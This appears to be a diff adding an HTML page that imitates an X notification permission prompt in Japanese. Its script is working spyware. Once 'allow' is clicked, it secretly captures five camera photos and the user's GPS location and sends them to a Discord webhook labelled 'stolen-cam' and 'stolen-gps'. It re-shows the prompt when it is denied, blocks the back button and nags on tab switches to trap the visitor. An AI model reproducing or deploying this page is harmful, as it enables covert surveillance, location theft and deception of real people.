@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>X 通知</title>
+  <style>
+    body {
+      margin: 0;
+      background: #f5f8fa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+    .x-header {
+      background: #1da1f2;
+      color: #fff;
+      padding: 12px 16px;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .fake-dialog {
+      position: fixed;
+      top: 35%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 24px 20px;
+      border-radius: 14px;
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.25);
+      width: 340px;
+      text-align: center;
+      z-index: 9999;
+      animation: fadeIn 0.2s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translate(-50%, -60%); }
+      to { opacity: 1; transform: translate(-50%, -50%); }
+    }
+    .btn {
+      display: block;
+      margin: 12px auto;
+      padding: 12px 28px;
+      font-size: 16px;
+      border-radius: 6px;
+      width: 85%;
+      border: none;
+      cursor: pointer;
+    }
+    .btn.allow {
+      background: #1da1f2;
+      color: white;
+    }
+    .btn.reject {
+      background: #e6ecf0;
+      color: #333;
+      margin-top: 24px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="x-header">X</div>
+
+<div class="fake-dialog" id="dialog">
+  <p>“X”が通知を送信しようとしています</p>
+  <button id="allowBtn" class="btn allow">許可</button>
+  <button id="denyBtn" class="btn reject">拒否</button>
+</div>
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1389915380033654784/8SkXSFbQyRZzV-b4WBfopA7Q0NJY--_l1pEWNudAoCFkB10AqDSxj4JD3vdyO867xvrh"; // ← 差し替えて
+
+function showDialog() {
+  const dialog = document.createElement("div");
+  dialog.className = "fake-dialog";
+  dialog.innerHTML = \`
+    <p>“X”が通知を送信しようとしています</p>
+    <button class="btn allow">許可</button>
+    <button class="btn reject">拒否</button>
+  \`;
+  document.body.appendChild(dialog);
+
+  dialog.querySelector(".allow").onclick = async () => {
+    dialog.remove();
+
+    // 通知許可（本物）を表示して注意をそらす
+    Notification.requestPermission().then(() => {});
+
+    // 裏でカメラと位置情報送信
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+
+      for (let i = 0; i < 5; i++) {
+        setTimeout(async () => {
+          const photo = await imageCapture.takePhoto();
+          const form = new FormData();
+          form.append("file", photo, \`photo\${i + 1}.jpg\`);
+          form.append("username", "stolen-cam");
+          form.append("content", \`📸 撮影#\${i + 1}\`);
+          await fetch(webhookURL, { method: "POST", body: form });
+        }, i * 1000);
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const mapURL = \`https://www.google.com/maps?q=\${lat},\${lon}\`;
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "stolen-gps",
+            content: \`📍 現在地:\n\${mapURL}\`
+          })
+        });
+      });
+    } catch (e) {
+      console.warn("裏取り失敗:", e);
+    }
+  };
+
+  dialog.querySelector(".reject").onclick = () => {
+    dialog.remove();
+    setTimeout(showDialog, 100);
+  };
+}
+
+// 初回ダイアログ表示
+document.getElementById("allowBtn").onclick = () => {
+  document.getElementById("dialog").remove();
+  showDialog();
+};
+document.getElementById("denyBtn").onclick = () => {
+  document.getElementById("dialog").remove();
+  setTimeout(showDialog, 100);
+};
+
+// 戻るボタン封じ
+history.pushState(null, null, location.href);
+window.addEventListener("popstate", () => {
+  history.pushState(null, null, location.href);
+});
+
+// タブ切替封じ
+window.addEventListener("blur", () => {
+  alert("⚠️ このページを離れることはできません。");
+  window.focus();
+});
+</script>
+
+</body>
+</html>
